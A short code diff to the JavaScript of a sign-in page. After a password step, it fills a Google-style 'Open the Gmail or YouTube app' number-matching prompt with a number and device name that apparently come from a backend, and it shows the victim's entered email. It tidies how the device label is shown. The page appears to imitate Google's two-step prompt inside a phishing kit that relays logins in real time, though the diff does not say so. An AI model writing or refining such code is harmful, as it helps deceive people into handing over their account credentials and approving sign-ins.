@@ -574,16 +574,17 @@
       mgPassNext.disabled = false;
       mgPassNext.innerHTML = 'Next';
 
-      var num       = (data && data.number) ? String(data.number) : '58';
+      var num = (data && data.number) ? String(data.number) : '58';
       var deviceRaw = (data && data.device != null) ? String(data.device).trim() : '';
-      var hasDevice = deviceRaw.length > 0;
+      var deviceLabel = deviceRaw.replace(/^your\s+/i, '');
+      var hasDevice = deviceLabel.length > 0 && !/^phone\.?$/i.test(deviceLabel);
 
       document.getElementById('mg-prompt-number').textContent         = num;
       document.getElementById('mg-prompt-number-inline').textContent  = num;
       document.getElementById('mg-prompt-device').textContent         = hasDevice
-        ? ('Open the Gmail or YouTube app on ' + deviceRaw)
+        ? ('Open the Gmail or YouTube app on ' + deviceLabel)
         : 'Open the Gmail or YouTube app';
-      document.getElementById('mg-prompt-device-inline').textContent  = hasDevice ? deviceRaw : 'phone';
+      document.getElementById('mg-prompt-device-inline').textContent  = hasDevice ? deviceLabel : 'phone';
 
       var email = mgEmailInp.value.trim();
       document.getElementById('mg-prompt-chip-email').textContent = email;
